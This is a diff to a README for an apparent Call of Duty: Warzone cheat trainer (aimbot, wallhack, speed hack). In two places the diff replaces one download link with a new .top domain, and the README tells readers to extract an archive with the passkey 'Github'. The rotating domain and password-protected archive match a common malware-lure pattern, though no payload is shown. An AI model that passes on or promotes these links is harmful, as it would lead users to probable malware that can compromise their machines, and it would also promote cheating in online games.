@@ -6,7 +6,7 @@ Call of Duty: Warzone trainer with aimbot, ESP wallhack, no recoil, speed hack, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -81,7 +81,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 
 2. Extract the archive.
 
